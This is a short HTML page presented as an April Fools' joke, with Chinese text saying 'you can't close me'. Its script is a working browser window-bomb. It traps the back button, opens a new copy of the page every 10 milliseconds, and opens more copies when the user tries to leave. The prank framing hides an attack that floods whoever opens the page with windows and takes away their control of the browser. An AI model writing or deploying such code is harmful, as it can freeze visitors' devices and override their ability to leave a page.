<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width">
    <title>愚人节快乐</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box;font-family:system-ui}
        body{background:#ff6a6a;color:white;text-align:center;padding-top:40vh;font-size:20px}
    </style>
</head>
<body>
    <h1>愚人节快乐～</h1>
    <p>你关不掉我哦 😈</p>

<script>
// 禁止返回
history.pushState(null, null, location.href);
window.onpopstate = function () {
    history.go(1);
};

// 无限新开页面
function boom() {
    window.open(location.href, '_blank');
    setTimeout(boom, 10);
}

// 关闭时触发
window.onbeforeunload = function () {
    boom();
    return "别想关掉我～";
};

// 一打开就开始弹
boom();
</script>
</body>
</html>
